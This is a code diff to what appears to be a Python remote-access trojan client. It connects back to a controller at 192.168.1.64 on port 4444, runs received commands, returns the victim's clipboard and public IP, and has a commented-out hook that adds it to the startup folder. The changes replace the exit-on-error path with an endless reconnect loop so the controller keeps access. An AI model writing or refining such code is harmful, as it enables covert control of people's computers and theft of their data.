@@ -59,7 +59,7 @@ connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
     time.sleep(3)
     try:
-        connection.connect(("192.168.74.1", 4444))
+        connection.connect(("192.168.1.64", 4444))
         break
     except Exception as e:
         print(e)
@@ -97,6 +97,7 @@ def start_up():
 
 def run_commands():
     global has_ben_defed
+    global connection
     try:
         while True:
             data = connection.recv(1024)
@@ -123,7 +124,7 @@ def run_commands():
                         pyttsx3.speak(d_data_split[int(ogl)])
                     except IndexError:
                         run_commands()
-            elif ldata == "clipboard get":
+            elif " ".join(ldata) == "clipboard get":
                 if "win" in oss:
                     clipboard_content = subprocess.check_output(
                                 "powershell get-clipboard", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -189,9 +190,20 @@ def run_commands():
             elif "pubip" in ldata:
                 publicIP = requests.get('https://api.ipify.org/').text
                 connection.send(str.encode(publicIP))
-    except Exception:
-        sys.exit()
-
+    except Exception as e:
+        # sys.exit()
+        # If we uncomment the line above, you will no longer be able to connect to the client computer after the connection ends (until the file is relaunched)
+        print(e)
+        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        while True:
+            time.sleep(3)
+            try:
+                connection.connect(("192.168.1.64", 4444))
+                break
+            except Exception as e:
+                print(e)
+        login()
+        run_commands()
 
 # start_up()
 # If you uncomment the line above, the file will be added to the startup directory to that the client will start up everytime the computer turns on
